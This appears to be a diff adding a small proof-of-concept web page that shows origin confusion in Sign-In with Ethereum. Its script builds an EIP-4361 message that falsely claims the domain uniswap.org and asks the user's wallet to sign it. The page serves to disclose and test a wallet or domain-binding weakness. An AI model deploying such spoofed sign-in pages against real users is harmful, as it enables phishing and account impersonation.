@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>PoC — SIWE Domain Mismatch (Origin Confusion)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body>
+<h1>SIWE Domain Mismatch Demo</h1>
+<p>This page is <b>NOT</b> uniswap.org, but the SIWE message claims it is.</p>
+<button id="sign">Sign In</button>
+<pre id="log">(idle)</pre>
+
+<script>
+const log = m => document.getElementById("log").textContent += m + "\n";
+
+function buildSiweMessage(address, statement = "Sign in") {
+  // EIP-4361 formatted message (textual SIWE), with a spoofed domain/uri
+  const domain = "uniswap.org"; // claimed domain (spoof)
+  const uri    = "https://uniswap.org/login"; // claimed URI (spoof)
+  const nonce  = Math.random().toString(36).slice(2);
+  const issuedAt = new Date().toISOString();
+  const chainId  = 1;
+
+  return (
+`${domain} wants you to sign in with your Ethereum account:
+${address}
+
+${statement}
+
+URI: ${uri}
+Version: 1
+Chain ID: ${chainId}
+Nonce: ${nonce}
+Issued At: ${issuedAt}`
+  );
+}
+
+document.getElementById("sign").onclick = async () => {
+  if (!window.ethereum) return alert("No wallet found");
+  try {
+    const [acct] = await ethereum.request({ method: "eth_requestAccounts" });
+    const msg = buildSiweMessage(acct, "Login to continue");
+    const sig = await ethereum.request({
+      method: "personal_sign",
+      params: [msg, acct]
+    });
+    log("Signed. SIWE message:\n" + msg + "\nSignature:\n" + sig);
+  } catch (e) {
+    log("Rejected: " + (e && e.message ? e.message : e));
+  }
+};
+</script>
+</body>
+</html>
